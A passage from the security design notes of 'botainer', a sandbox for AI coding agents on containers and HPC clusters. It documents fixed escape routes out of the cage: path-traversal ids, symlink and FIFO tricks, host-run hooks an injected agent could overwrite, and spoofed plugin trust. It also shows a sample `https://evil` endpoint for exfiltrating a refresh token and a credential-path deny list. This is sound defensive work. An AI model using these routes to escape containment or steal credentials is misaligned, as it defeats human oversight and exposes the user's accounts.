   evidence rather than an absence. Same status as `Reviewed-By:`.

   Mechanically, the inventory requirement is enforced by the **commit-msg**
   hook rather than pre-commit, because at pre-commit git has not written the
   message and no trailer can be read. Pre-commit defers with a note — and
   REFUSES outright if the commit-msg hook is not installed, so deferring can
   never silently delete the gate.

This is the workflow that would have caught the umbrella-bind
disaster at commit time.

## 4aw. Job-dispatcher ids are caller-derived, and the viewer on an HPC node

Four properties this document already claimed, each of which the implementation
did not actually hold. All four are enforced now, with regression tests in
`tests/unit/test_warm_pool.py`.

1. **Agent-chosen `id` was a host path component (CRITICAL).** The caged agent
   controls the request JSON. `route_hot_task` (`botainer/hpc/pool.py`) and the
   `pool_control` handler (`botainer/cli/hpc.py`) interpolated `request["id"]`
   into a host filename with no validation, so a path-shaped id
   (`./../../../…`) wrote `*.json` outside the mailbox — with full body control
   on the hot path. Now validated **at the sinks**: `route_hot_task` requires a
   16-hex job id, and `_write_status` (`botainer/hpc/dispatcher.py`) requires a
   non-path-shaped filename component (`[A-Za-z0-9_-]{1,64}` — wider than
   16-hex because pool-control ids are short labels). Sink-level so a future
   caller cannot silently reopen it. This restores §4ae ("agent can't create
   files here") and §4an ("per-worker mailbox … HOST-PRIVATE").

   **Upgraded from a filter to a structural property (same audit round).**
   Charset-validating attacker input only holds while the filter is complete —
   it is *catching* bad data, not *preventing* it. `route_hot_task` no longer
   consults `request["id"]` at all: the dispatcher already derives the id from
   the inbox FILENAME and validates it before opening the body, so that value is
   passed in and is the only thing that becomes a path. A hostile `id` in the
   request body is now **inert**, not merely rejected. The residual check inside
   `route_hot_task` is an assertion on botainer's own value (if it fires, the
   caller is wrong, not the agent). `_write_status` remains a genuine validation
   boundary — pool-control ids are short operator-chosen labels with no filename
   to derive from — and is documented as a filter, not a structural guarantee.
2. **Warm-pool worker sbatch had no `--output` (CRITICAL).** Slurm therefore
   defaulted to `<submit-dir>/slurm-%j.out`, and the submit CWD is the project
   root — bound **rw** at `/workspace`. slurmstepd writes as the *uncaged* user
   and follows symlinks, so a pre-planted `slurm-<N>.out` symlink redirected a
   host write anywhere. Same escape primitive as task #48, missed on the warm
   -pool path. Both streams now go to the host-private `run/pool/<worker>/`.
3. **The fail-closed path re-read the agent-writable inbox (HIGH).** A plain
   `read_text()` (no `O_NOFOLLOW`, no `O_NONBLOCK`) meant a planted FIFO hung
   the dispatcher **forever** — silently, since nothing raised. The id is now
   derived from the already-validated filename; the second read is gone. This
   restores §4ai ("a planted FIFO can't block the open … refused, not hung").
4. **HPC browser viewer recorded an always-empty node (CRITICAL, parity).**
   `start_viewer.py` read `HOSTNAME`, which is **not** in
   `botainer/plugins/hooks.py::_HOOK_ENV_ALLOWLIST` — hooks run with a filtered
   env, so the node was always `""`. `gateway` refused every HPC session and
   `watch` printed a **hostless** `ssh -L`. Now reads `SLURMD_NODENAME` (which
   *is* allowlisted, and is set on the compute node). Under sbatch
   compose-at-submit the hook runs on the login node where the node genuinely
   isn't known yet — `watch` now says so and tells the user how to find it,
   instead of emitting a broken command.

## 4ax. Host-executed code may not live where the agent can write

**Invariant:** code the HOST executes must not live in any location the CAGED
AGENT can write. Enforced in `botainer/plugins/hooks.py::refuse_agent_writable_hook`,
called from `run_hook` — the single point where a hook is executed — with the
writable roots derived from the session's own mount plan
(`composition._agent_writable_bind_sources`: every bind rendered without `:ro`,
i.e. `rw`, `unix-socket`, `fifo`).

**The hole this closes.** In an EDITABLE install, `list_installed()` overlays the
clone's `plugins/` tree and **source wins** (`plugins/lifecycle.py:52-106`). When
the project root IS the botainer clone — the develop-botainer-inside-botainer
workflow botainer is built around — that tree is bound **rw** at `/workspace`. A
prompt-injected agent could overwrite `plugins/<x>/hooks/pre_session.py` and the
launcher would execute it **on the host, as the user**, at the next
`botainer start`. Same class as the `.git/hooks` escape the `git` plugin exists to
prevent, with no guard at all. Ordinary user projects were never affected
(`~/.botainer/plugins/` is not inside a bind source), so the refusal only fires on
exactly the configuration that was exploitable.

**Structural, not a filter.** It does not inspect the script for malice or match
path patterns; it refuses the *location*. The check resolves symlinks on both
sides, so a link pointing into the writable tree is refused too. The
`agent_writable_roots` parameter of `run_hook` is REQUIRED (not defaulted) so a
future call site cannot silently opt out — forgetting it is a `TypeError`, not a
silent bypass.

The Claude and Codex broker daemon launches, interactive setup from Start,
HPC submit/attach forwarding, scheduled nudge, and automatic dispatcher
invoke their existing Python module with `-I -B`. These calls do not load
Botainer through the current directory, `PYTHONPATH`, or the user site.
Botainer and the child's dependencies must be importable from the selected
interpreter's non-user installation paths. This covers those named calls; it is not a claim about
every host Python subprocess or about the integrity of an editable install.

## 4ay. Plugin trust is mechanism-derived, never self-declared

**Invariant:** a plugin's tier comes from HOW it was installed, never from what
its own tree claims. `botainer/plugins/trust.py` already stated this ("Trust
comes from a launcher-shipped allowlist, not a self-declared manifest field");
two paths violated it.

**S1 — URL path confusion (`plugins/install.py`).** `_source_is_first_party()`
was a string prefix test (`source.startswith("https://github.com/botainer/")`).
Network install is *not implemented* — every `git+`/`git@`/`git://`/`https://….git`
source is refused — so that test was 0% functional and 100% spoofable: an
unhandled source falls through to `Path(source)`, and
`Path("https://github.com/botainer/x")` is the **relative path**
`https:/github.com/botainer/x`. A directory of that shape (which the caged agent
can create inside `/workspace`) installed as if it were the canonical URL,
granting: a reserved bundled plugin **name** — so `rmtree(final); rename(final)`
overwrites the real `agent-claude` already enabled in every project — plus a
skipped self-declaration refusal and a skipped hook-consent gate. The bait is a
README saying `botainer plugin add https://github.com/botainer/<name>`.
Now: `_source_is_first_party()` returns **False unconditionally** (first-party is
`builtin.install_bundled` only), and any source carrying a **URL scheme** is
refused rather than coerced to a path — the whole scheme-shaped class, not the
confusing members of it.

**S2 — self-declared tier for unrecorded trees (`plugins/lifecycle.py`).** The
tier fallback was `lock.tier if lock else m.tier`, so **any** directory with no
lock entry got the tier it claimed about itself: `cp -r` a tree declaring
`tier: first-party` into `~/.botainer/plugins/` and the compose-time ceiling and
hook registration honored it, bypassing `install.py` entirely. Now there are
exactly two trust mechanisms — (1) an `installed.lock` entry, written by the
launcher at install time; (2) the editable source tree, located by walking up
from `botainer/__init__.py` to the `pyproject.toml` naming botainer (i.e. the
launcher's own shipped tree, not a claim). Anything else has no evidence and gets
`third-party`, which the default ceiling (`allowed_tiers: ["first-party"]`)
refuses.

Note: a pre-existing test (`test_compose_refuses_plugin_declaring_contributes_sidecars`)
was passing *because of* S2 — its comment said it set `tier: first-party` to clear
the ceiling. It now grants the tier via a lock entry, i.e. via the mechanism.

## 4az. Cross-node refusal is transport-agnostic

`_refuse_cross_node_binds` check 1 is **bind-shaped** (`UNIX_SOCKET` / `FIFO`), so
it was blind to a rendezvous that carries no bind. `agent-codex-broker` is **TCP on
every runtime** and contributes only an env var, so it sailed through: `botainer
hpc submit` succeeded, the broker daemon started on the **login node**,
`OPENAI_BASE_URL=http://127.0.0.1:<login-port>/…` was baked into the sbatch script,
the submit process exited and the daemon died ~30 s later via its launcher-PID
watchdog — and hours later the job started on a compute node and got
`ECONNREFUSED` on every request, after burning the queue wait **and** the
allocation. `submit.py`'s name gate matches only `*-proxy`, so it missed it too.

Check 3 now refuses any `spec.env` value naming a loopback host (`127.0.0.1`,
`localhost`, `[::1]`, `host.docker.internal`). A loopback address is host-local
**by definition** — that is what makes this a property rather than another
plugin-name list, and it catches any future plugin that hands the container an
endpoint only the composing host can reach.

The §4-broker disclosure previously asserted "the cross-node bind check refuses
it", which was **false for the TCP broker**. That claim is now true for both
transports.

## 4bb. `--preflight` checks every forbidden source it advertises

botainer's own development rules call `botainer start --preflight` "the gate",
to be run before pushing any
security-surface change, and §5 of this document lists sources that are "never"
exposed. The check backing that claim was **5/7 dead**: the list mixed absolute
paths with bare names, but the matcher (`_path_matches`, exact-or-under against the
whole source) can never match a bare name to an absolute path. Verified pre-fix:

    /var/run/docker.sock  -> NOT CAUGHT     /home/user/.aws   -> NOT CAUGHT
    /home/user/.ssh       -> NOT CAUGHT     /home/user/.kube  -> NOT CAUGHT
    /etc/passwd           -> caught

The list is now split **by match semantics**, so every entry is functional and its
intent is unambiguous:
* `_FORBIDDEN_BIND_PATHS` — matched exact-or-under (`/etc/passwd`, `/etc/shadow`,
  the docker socket paths).
* `_FORBIDDEN_BIND_COMPONENTS` — matched against any path **component**, because a
  credential dir lives under an arbitrary home (`/home/u/.ssh`, `/Users/u/.ssh`,
  `/root/.ssh`) and cannot be written as one absolute prefix. Component-wise, not
  substring, so `.kube-backup` does **not** match `.kube`. Also adds `.gnupg` and
  `.docker`, which the source denylist in `mount_plan/validation.py` already
  treats as sensitive.

## 4bc. Site-policy validation, and the recovery path when it fails

The **site** policy (`/etc/botainer/policy.yaml`) is the root-owned trust anchor:
it is intersected into every session's effective policy, so an unparseable one
refuses **every botainer command for every user on the host**. Three compounding
defects made that both easy to trigger and hard to escape:

* `docs/SITE-ADMIN.md`'s copy-pasteable heredoc wrote `version: 1`. YAML parses
  that as an int, `SitePolicy.version` is `str` with no coercion → refusal with a
  raw pydantic dump. The doc is fixed, **and** `version` now has a validator that
  states the required value rather than emitting a type error.
* `botainer policy {show,path,get,set}` carried no `@handle_refusals`, so the
  command you reach for *when policy is the problem* printed a traceback. All four
  are wrapped.
* `botainer doctor` only `stat()`'d the file and reported `ok`, green-ticking the
  very policy that was breaking everything (exit 0). It now parses via the same
  loader and emits an actionable `err`.

A regression test extracts every `/etc/botainer/policy.yaml` heredoc from
`SITE-ADMIN.md` and validates it against `SitePolicy`, so a doc snippet can no
longer ship in a state that bricks a host.

## 4be. Credential-shaped env never reaches the command line

Both adapters render `spec.env.values` as `--env K=V` / `-e K=V`. On a shared HPC
login or compute node `/proc/<pid>/cmdline` is world-readable, so a co-tenant could
read the **codex broker's sentinel** — which is not merely the container's
`OPENAI_API_KEY` but the broker daemon's **only TCP access token** (codex is TCP on
every runtime) — and spend the user's subscription for the life of the session.

The project already states the rule, at `plugins/browser/hooks/start_viewer.py:12`:
*"NEVER via `--env`, which is visible in `ps` on a shared apptainer node."* The
viewer obeyed it; the brokers did not.

It is now enforced **centrally**, after pre_session hooks merge their env: any
credential-shaped key is split out of `spec.env.values` and written to a **0600
`secret-env` file in the host-private session dir**, delivered via `--env-file`
(which both adapters already consume, and apply *before* the explicit flags, so
semantics are unchanged). A value containing a newline is **refused** rather than
silently truncated or split into a second key.

Structural, not per-plugin: a new plugin that contributes a secret gets the safe
path without its author remembering. Broker sentinels are deliberately included
even though the leak guard exempts them — a sentinel carries no *provider* secret,
but it **is** the broker's access token.

Note the file is in the session dir, which is never a bind source, so the caged
agent cannot read it; the container receives the values as ordinary env.

## 4bo. HOME on Apptainer — APPTAINERENV_HOME is refused, so HOME is set another way

**`APPTAINERENV_HOME` cannot set HOME under apptainer**, so it must be set some
other way. Observed on a real cluster session:

```
WARNING: Overriding HOME environment variable with APPTAINERENV_HOME is not permitted
```

Apptainer was telling us it had **ignored** the launcher. `HOME` is protected;
`--env HOME=…` is refused and dropped.

Composition sets `HOME=/home/user` so npm/npx, pip and Claude Code's `~/.claude`
land in the persistent per-project home bind — the root fix behind the
browser-npx and /tmp-splatter failures. `composition.py` even asserted the
mechanism in a comment: "Crosses `apptainer --cleanenv` as `--env` (adapters
render spec.env.values)." On Apptainer that was false.

**Effect.** The home directory was bound at
`/home/user` and nothing pointed at it, so on apptainer `$HOME` was not the
persistent bind. The first version of this entry claimed "every cache,
credential and package write went somewhere ephemeral" — that was wrong, and
asserted without checking.

What actually happens is that the agent image is **designed around** unusable
HOME. `plugins/agent-claude/Dockerfile:145` says so explicitly ("apptainer the
container runs as the caller's host uid with HOME=/ (unwritable)") and routes
every path that matters away from it:

| Route | Destination |
|---|---|
| `CLAUDE_CONFIG_DIR` | `/home/agent/.claude` (credentials, settings) |
| `PYTHONPATH`, `NODE_PATH`, `JULIA_DEPOT_PATH`, `R_LIBS_USER`, `CONDA_ENVS_PATH`, `CARGO_HOME`, `GOPATH` | `/packages` (persistent) |

So credentials and installed packages were never at risk. The real residue is
what has no explicit route: npm's own cache (`~/.npm`), pip's cache
(`~/.cache/pip`), shell history, stray dotfiles — regenerable, not data loss.

**This is why "Claude Code works in the container" does NOT prove HOME is
correct**, and why the failure went unnoticed: the agent reads
`CLAUDE_CONFIG_DIR`, never `$HOME/.claude`, so it authenticates and runs
identically either way.

**Measured on a real cluster** (agent-run, inside a real session, pre-fix):

```
HOME=/home/<cluster-account>         <- NOT /home/user
$HOME contents: .cache .conda .config .local .npm
/home/user                           <- EMPTY. mounted, never used.
CLAUDE_CONFIG_DIR=/home/agent/.claude
/packages: pip node_modules conda_envs cargo go julia_depot R_libs
```

Three things this settles. (1) `$HOME` was the host home PATH backed by an
apptainer `--containall` tmpfs — **not** the real host home, so there was no
containment breach; a genuine `/home/<user>` would carry the user's dotfiles and
this carried only session-created caches. (2) The persistent bind really was
inert: `/home/user` empty while the tmpfs accumulated. (3) The damage is exactly
the unrouted residue predicted above — `.npm`, `.cache` (pip), `.conda`,
`.local` are recreated every session, so each cluster session re-downloads
them. Credentials (`/home/agent/.claude`) and packages (`/packages`) were
populated and unaffected, which is why nothing appeared broken.

**Status of the fix.** `--home` is therefore a CLEANUP, not a critical repair:
it silences a real warning, makes `$HOME` actually correct, and removes the
product's dependence on that env-routing table staying exhaustive — a custom or
future image that forgets one route would inherit the original bug. Keeping it
is right; describing it as data loss was not.

**Fix — use the mechanism the runtime honours.** `--home <src>:<dest>` both
binds the directory and sets `HOME`, so it replaces the rejected `--env` *and*
the separate `--bind` for the same path (mounted once, asserted by the test).
Structural rather than a workaround: `HOME` is now set by the component that
owns it instead of asserted through a channel that component discards.

**Why no test caught it.** The existing coverage asserted `--env HOME=…` was
**present in argv** — and it was, right up until apptainer threw it away.
Presence in argv is not effect. The replacement test asserts the honoured
mechanism and that the path is bound exactly once; mutation-verified by
reverting to `--env`.

**NOT YET VERIFIED ON HARDWARE.** There is no Apptainer in the development
container, so this is argv-level only. It needs one real cluster run to confirm
`$HOME` is `/home/user` inside the cage, and that the site's `apptainer.conf`
permits a user-specified `--home` (if it does not, the fallback is exporting
`HOME` in the entrypoint trampoline, which no site policy can veto). Until that
run happens, treat this as a fix in flight, not a closed finding.

## 4bp. `constraint:` — operator-fixed hardware pinning

A `job_profiles` entry may now carry `constraint:`, rendered as
`#SBATCH --constraint=<features>`, pinning a job to a node feature set (a CPU
generation, an interconnect). Motivation is benchmarking: cluster partitions mix
hardware, so two runs of the same job land on different silicon and the timings
are not comparable. GPU *model* pinning already existed via `gpu_type` →
`--gres=gpu:<model>:<n>`; this is the CPU-side equivalent.

**Trust — structural, and deliberately so.** This value is interpolated into an
`#SBATCH` directive, which is exactly the position that produced the confirmed
HIGH sbatch-injection finding. The protection is that **no agent-supplied value
can reach it**:

- there is no `max_constraint`, so the "fixed by default, opt-in max" override
  path that exists for cpus/memory/gpus/nodes/time does not exist here;
- `botainer-job submit` exposes no `--constraint`;
- the value therefore comes only from the operator's `config.yaml`, the same
  trust shape as `partition`, `account` and `exclusive`.

A prompt-injected agent selects a profile BY NAME and receives whatever
constraint the operator wrote. It cannot author one.

**Backing filter, and what gap it backs.** `JobProfile._validate_constraint`
charset-restricts the value to `[A-Za-z0-9._:+&|-]` (the general sbatch charset
plus Slurm's `&`/`|` feature operators; bracket-count syntax is excluded as rare
and grammar-widening). Per the structure-over-rules rule, the gap this backs is
named: it is **not** the agent boundary (that is structural above) — it catches
the operator's own typo and a `config.yaml` edited by someone who is not the
operator. Unlike the session path in `hpc-launcher/host_helper/_common.py`,
`render_child_sbatch` has **no** sink-level re-check; the code comment says so
rather than implying one.

**Both render sites, not one.** `dispatcher.render_child_sbatch` (cold jobs) and
`pool.render_worker_sbatch` (warm-pool workers) both emit it. A warm worker
missing the constraint would hold its allocation on any node in the partition
while `--hot` tasks routed to it believed they were on pinned hardware — the job
would succeed and the numbers would silently be wrong, which is worse than a
failure. Each site has its own test; both are mutation-verified.

Not added: `nodelist:` (`--nodelist=<node>`). A named node that is down or busy
queues the job indefinitely, which is an easy way to strand an agent-dispatched
job for no reproducibility gain over a feature constraint.

## 4bq. Mount-mode tokens have no host-side refresh — an OPEN gap

Surface-neutral (a read-only status command gains an inference), but it names a
real gap in credential handling, so it belongs here.

**The shape.** In `shared` mode the host-wide store IS bound into the container,
read-write, at `/shared-auth/agent-<name>` — see the mount tables in §1 and §2,
which are the authority for what is bound. A refreshed token is back-filled
upward — gated on the #158 anti-poisoning checks
(`sk-ant-oat*`/`sk-ant-ort*` prefixes, ≥64 chars, ≤60-day expiry delta) that
exist so a hostile in-container agent cannot poison the store every other
project reads.

**The gap.** Nothing on the HOST ever refreshes a mount-mode token. The refresh
happens *inside* a running container. So if a back-fill is refused, the master
stops advancing: the project that did the refreshing keeps working from its own
copy, while every NEW project copies the stale master and reports "login
expired". Two projects, identical config, opposite outcomes — and nothing the
user did differs, which is what made it unexplainable from outside.

A refused back-fill writes ONE line to stderr and moves the file aside. In an
sbatch job that lands in a Slurm output file nobody reads.

**What changed here.** Only diagnosis, deliberately:
- `_credential_expiry()` reads the same `claudeAiOauth.expiresAt` the broker
  consumes; `auth status` reports valid/expired/unknown/absent instead of
  `path.exists()`. It fails toward "unknown WITH a reason", never a false
  "valid".
- `auth status` detects the specific stale-master shape (shared mode + expired
  master + valid per-project copy) and states the consequence — this project
  works, new ones will not — plus the exact remedy.

**What did NOT change, and why.** The cure is host-side refresh, and the
machinery exists and is tested: `broker/oauth_refresh.py::RefreshingOAuthKeystore`
refreshes under the cross-node lock in `broker/refresh_lock.py`. Wiring it to
the shared/isolated path would make the master self-healing and remove the
re-login. It was not done in the same change because it MUTATES live OAuth
tokens including rotation, cannot be exercised in the dev container (no real
endpoint), and a mistake invalidates a working credential rather than merely
mis-reporting one. Detection is safe to ship immediately; rotation is not.

Tracked as the open half of this entry, not as done.

## 4br. `auth login` routing — which credential store a login writes

Credential ROUTING, so it belongs here even though no grant changed: this
decides which store a login writes.

**Was:** `explicit flag > policy default_auth_mode`. The project's own
configured mode was never consulted. Standing in a project configured
`isolated` and running `botainer auth login --agent claude` performed a
**shared** login: it succeeded, printed nothing unusual, and left that project
still logged out. `auth status` then showed it unauthenticated immediately
after a successful login.

**Now:** `explicit flag > THIS PROJECT's active mode > policy default`, and
**every path announces the mode and where it came from**. The announcement is
not decoration — the entire failure was a login that looked like it worked, so
a silent-but-correct resolution would still be a defect. (User: "maybe
shouldn't be silent.")

### PID 1 inside the cage must reap orphans

Not a capability grant — no privilege is added or dropped — but it IS part of
the cage's operating contract, and the two runtimes provide it by different
mechanisms, so it belongs in the inventory.

Both runtimes give the session its own **PID namespace** (docker by default;
apptainer via `--containall`, documented as containing "PID, IPC, and
environment"). In a PID namespace, a process orphaned by its parent is
re-parented to PID 1. If PID 1 is an ordinary application it has no reaping
loop, so every orphan becomes a permanent zombie holding a PID slot. Under a
`pids.max` cap the container eventually cannot fork, and the failures surface
far from the cause ("Resource temporarily unavailable", thread-spawn panics,
hooks failing at random) — flakiness in appearance, exhaustion in fact. Nothing
inside can recover: only PID 1 could reap and it will not.

| runtime | mechanism | status |
|---|---|---|
| docker | `--init` (tini as PID 1) | **added** — was missing |
| apptainer | init shim, started **by default** under `--pid` | already correct; `--no-init` would disable it |

This was an INVERTED parity defect: the HPC path was right and the laptop path
was wrong, the reverse of the usual direction. Observed in botainer's own dev
container: 466 zombies, all `ppid 1`, at `pids.max=512`.

Pinned by `test_adapter_argv.py::test_docker_always_runs_an_init_that_reaps_orphans`
(all three launch modes) and
`::test_apptainer_never_disables_its_default_init_shim`, the latter being a
regression guard on a default nothing in our code references — without it a
future author could add `--no-init` and reintroduce the bug on the HPC side with
no visible connection to this one.

### Codex login moved HOST -> CONTAINER; L1 now holds for both agents

**Was:** `agent-codex-shared/hooks/login.py` ran `subprocess.run(["codex",
"login"])` **on the host**, inheriting the full host environment and `HOME`,
setting `CODEX_HOME`/`OPENAI_CONFIG_DIR` and *hoping* the CLI honoured them. The
plugin's own comment recorded that as unverified, and it detected the breach
after the fact — "the L1 'no host credential store' promise was violated for
this login". It knew, reported, and prevented nothing.

**Now:** the OAuth flow runs inside the `agent-codex` container, mirroring
`agent-claude-shared`. Bind surface is ONE directory, `<state_root>/shared-auth/
agent-codex:/out`.

| | docker | apptainer |
|---|---|---|
| isolation | `--rm --init --user <uid>:<gid>` | `--containall --cleanenv --no-home` |
| binds | `-v <shared>:/out` only | `--bind <shared>:/out` only |
| network | `-p 127.0.0.1:<lo>-<hi>` loopback only | host network (required for the OAuth callback) |
| file mode | `umask 0077` → 0600 at creation | same |

`--no-home` on apptainer is load-bearing, not tidiness: some builds bind `$HOME`
even under `--containall`, which would place `~/.ssh`, `~/.aws` and `~/.config`
inside the very login container that exists to avoid them. Same reasoning as the
claude login.

**L1 is now STRUCTURAL for codex, not a filter.** Inside the cage there is no
host `~/.codex` to fall back to, so whether the CLI honours `CODEX_HOME` stops
being a security question. If it ignores the variable it writes to a path that
dies with the container, and the hook REFUSES with an explanation instead of
silently leaving a credential in the host store. Fail-quiet became fail-closed.

**Billing choice is now explicit.** OAuth bills the ChatGPT/Codex subscription;
an API key bills the API account per token. Previously chosen by whether a host
binary existed. Now: prompted with both consequences stated, overridable by
`BOTAINER_CODEX_LOGIN_METHOD=oauth|api-key`, and REFUSED when there is no TTY
and no explicit setting — failing closed on the option that spends money.

Pinned by `test_codex_login_asks.py::test_the_login_never_executes_a_host_codex_binary`,
which asserts against the SOURCE rather than by mocking, because the regression
shape is a future author reaching for `subprocess.run(["codex", ...])`.

### `botainer auth rotation-probe` — the one command that SENDS the refresh token

The most security-relevant surface in the auth family, and the only botainer
command that transmits the **durable** secret. Everything else in this family
reads files or edits a timestamp; this one puts the refresh token on the wire.

**What it sends, and where.** Up to two POSTs to a PINNED endpoint —
`https://api.anthropic.com/v1/oauth/token` with a PINNED client_id — carrying
`{grant_type, refresh_token, client_id}`.

**Both values are hardcoded in `botainer/cli/auth_probe.py` and are NEVER read
from config**, for exactly the reason the broker plugin pins its copies: a
hostile `.botainer/config.yaml` (git-shareable, agent-adjacent) setting
`token_endpoint: https://evil` would exfiltrate the durable credential. Config
must never decide where a secret is sent. This is structural, not a filter —
there is no code path that reads a destination from anywhere else.

**What it mutates.** Your live credential, deliberately: it rotates the token
(twice, if old tokens turn out to remain valid). Backup taken before any network
call; every successful refresh persisted atomically BEFORE the next call is
attempted, so the newest working token is always on disk. The one unavoidable
window is a crash between a 200 response and the disk write.

**Consent.** Interactive confirmation unless `--yes`. Nothing invokes it as a
side effect of a session, hook, or launch. Per the user's directive
key rotation counts as something requiring agreement, even though this is not a
broker.

**It is deliberately NOT a broker** and does not import
`botainer.broker.*` — two calls, no daemon, no request proxying, nothing that
spends a subscription by serving traffic. `tests/integration/test_broker_requires_consent.py`
enforces that separation, so this command cannot quietly become one.

**Why it exists:** to settle EF-1 of the external-facts register (internal) —
whether a refresh INVALIDATES the previous refresh token — which decides whether
concurrent sessions can share one login, and therefore whether a host-side
refresher needs building at all.

### `botainer auth rotation-test` — the one command that MUTATES a credential

Listed prominently because it is the exception: every other diagnostic in this
family is read-only, and this one deliberately is not.

**What it writes.** `arm` copies the chosen credential to
`<state_root>/rotation-test-backup-<epoch>.json`, records digests to
`<state_root>/rotation-test.json`, and then **overwrites `expiresAt` in the live
credential file** with a past timestamp. That backdating is the entire point —
it forces the next real API call to refresh, turning a ~1h wait per trial into
seconds — but it does mean a botainer command modifies a file the agent
authenticates with.

**Why that is acceptable, stated rather than assumed:**
 - The ONLY field changed is `expiresAt`. No token is written, moved, or
   derived. The worst outcome is a refresh happening earlier than it otherwise
   would have.
 - A backup is taken BEFORE the write, its path is printed, and `restore` puts
   it back. Failure mode is re-running `auth login`, not losing an account.
 - It is explicitly user-invoked with an argument (`arm`); nothing triggers it
   as a side effect of a session, a hook, or a launch.

**What it stores:** `sha256[:12]` digests of the access and refresh tokens, plus
paths and a timestamp. Comparing digests across time IS the measurement, so no
token needs to persist. Pinned by
`test_auth_doctor.py::test_state_file_never_contains_token_material`, which
rejects the token and every 12-char substring of it from that file.

**Why it exists at all:** it settles experiment R1 — whether the OAuth server
rotates refresh tokens — which determines whether multi-holder shared auth mode
is viable or whether the broker (single holder) is required. It became a command
after two hand-written snippets failed to survive being pasted into a terminal.

**Reports INCONCLUSIVE as its own outcome.** If the access-token digest is
unchanged, no refresh occurred, and an unchanged refresh digest would otherwise
read as "no rotation" when it actually means the experiment never ran. That
distinction is the difference between an answer and a false one.

### `botainer auth doctor` — read-only credential-state inspector

READ-ONLY; grants nothing and mutates nothing. Listed here because it READS
every credential file on the host and prints a report, which makes its output a
disclosure surface.

**Discloses:** credential file PATHS, symlink-vs-regular-file, `expiresAt`,
mtime, and refresh-token EQUALITY GROUPS across holders.

**Never discloses:** any token, any substring of one, or any hash/fingerprint of
one. Holders are compared to each other and reported as opaque labels ("group
A"); two holders in the same group hold byte-identical tokens. That is the whole
fact the diagnosis needs, and it leaks nothing about the secret. Enforced by
`test_auth_doctor.py::test_no_token_material_is_ever_printed`, which rejects the
token, every 12-char substring, and sha256 prefixes at 8/12/16/64 chars — a
mutation adding a "harmless 8-char fingerprint" fails it.

**Why it exists:** two shared-mode failure modes present identically (a project
that stopped sharing because rename() replaced its symlink, vs. holders whose
refresh tokens diverged) and need opposite fixes. The command separates them
from observed state. It also prints what it did NOT verify: all checks are local
file state, so a token can look valid and be revoked server-side.

**Isolated outside a project is refused.** Isolated writes per-project
credentials into a project's state dir; in a random directory there is nowhere
legitimate to put them, so it refuses instead of inventing state where the user
did not intend it. Checked on the RESOLVED mode however it was reached — the
first cut guarded only the no-flag path, so an explicit `--isolated` in a random
folder sailed straight past, which is the likelier mistake rather than the safer
one. A behavioural test caught that before it landed.

**Mismatch warning.** An explicit `--shared` inside an isolated project (or the
reverse) writes a store that project will never read. It now says so at the
point of the mistake, and points isolated users at the in-session route
(Claude Code's own `/login`, which writes through the rw-bound per-project
credential dir) rather than leaving them to discover the store was irrelevant.

Tests drive the real click command and assert on output and on which login
plugin was invoked — not on source text, which would stay green if the
behaviour were deleted. Mutation-verified on both the resolution order and the
isolated guard.

## 4bs. Cluster profiles declare how far they were verified

A cluster profile sets partitions, accounts, time/CPU/GPU caps, the Lmod
bootstrap path and the scratch template. A profile transcribed from a vendor's
documentation and one actually run on the hardware look identical in a list —
but the difference decides whether a failed submit means "my config is wrong" or
"this profile was always a guess".

Before this, three of the four bundled `yale-*.yaml` recorded provenance as a
free-text COMMENT, in three different phrasings, and `yale-grace.yaml` — the one
actually exercised end-to-end — had none. A comment cannot be surfaced, so a
user choosing a profile learned nothing.

`verification: {status, last_checked, source}` is now part of
`cluster-profile-v1`, with four recognised levels (`tested-on-hardware`,
`from-probe`, `from-public-docs`, `community-contributed`), and is displayed by
`hpc info` and by `hpc setup` at the moment a profile is autodetected — green
for hardware-tested, yellow for a stated-but-weaker provenance, red otherwise.

**The load-bearing property is the DEFAULT.** An unstamped profile, and any
status outside the recognised set, both report `UNVERIFIED` and are refused by
`is_verified_on_hardware()`. Absence of a claim must never read as a claim, and
a typo must not invent a trust level. Mutation-verified in both directions,
including an attempt to overclaim a docs-derived profile as hardware-tested.

Bundled profiles were stamped from **their own existing header comments** — no
provenance was invented. `yale-grace` is `tested-on-hardware`;
Bouchet/McCleary/Milgram are `from-public-docs` with their YCRC source URLs and
original check dates; `generic-slurm` and `example` are
`community-contributed`.

Surface impact: none — this is metadata plus display. Recorded here because it
changes what the user is TOLD about a config that sets scheduler and filesystem
parameters, and this file is the contract for what we claim.

## 4bt. Shared-mode credential reconcile runs at session start AND at exit

**Why an exit reconcile is required.** Shared mode symlinks the per-project
`.credentials.json` at `/shared-auth/agent-claude/.credentials.json` so every
project uses ONE file — the same sharing several native `claude` sessions get
from `~/.claude`. Claude Code refreshes the token with a temp file plus
`rename()`, and `rename()` REPLACES a symlink with a regular file. The first
in-container refresh therefore detaches that project: it keeps the fresh token
locally, the shared store keeps the stale one.

Observed on the reporting user's cluster, which is what finally settled it after
three wrong theories:

```
lrwxrwxrwx  .claude.json      -> /shared-auth/agent-claude/.claude.json
-rw-------  .credentials.json                                 280 bytes
```

`.claude.json` (written in place) kept its symlink; `.credentials.json`
(atomic-renamed) did not. Same directory, same process, same second.

**Why it looked inexplicable.** `pre_session` already knew about this and
repaired it — its own comment says so — but it runs at session START, so the
repair landed only the next time you started THAT SAME project. Start a NEW
project and it symlinks to the stale shared file and reports "login expired",
while the old project carries on working. Two projects, identical config,
opposite behaviour, and nothing the user configured differs.

**Fix.** The reconcile is extracted from `pre_session.main()` into
`reconcile_shared_credential()` and additionally wired as a `post_session` hook,
so a refresh propagates when the session that produced it ends.

**No new trust surface.** The extracted function is the existing, already
reviewed logic verbatim, including the #158 anti-poisoning checks. Only WHEN it
runs changed. `post_session` is best-effort by construction: it runs after the
user's session ended, so a non-zero exit would report a successful session as
failed, and the reconcile is idempotent because `pre_session` repeats it.

**Residual gap, stated not implied.** A session killed outright (`scancel`, OOM,
node failure) runs no exit hook, so its refresh still waits for that project's
next start. Bounded and self-healing, where before it waited indefinitely.

**On the tests.** The first version of the anti-poisoning test used a
26-character fake token, so it failed the LENGTH guard and stayed green when the
PREFIX guard was deleted — a passing test proving nothing, the exact shape
`check-test-assertion-shapes` exists to catch. Mutation testing found it. Each
of the four guards (prefix, length, expiry delta, and the back-fill direction)
now has a case that defeats exactly that one guard, and all four are
mutation-verified.

## 4bu. Which plugins `plugins_enabled` does not gate, and where that is said

A user ran cluster jobs successfully without `hpc-launcher` in
`plugins_enabled`, never realised it was supposedly required, and could not tell
whether something was wrong.

Nothing was. `plugins_enabled` selects which plugins COMPOSE — composition.py
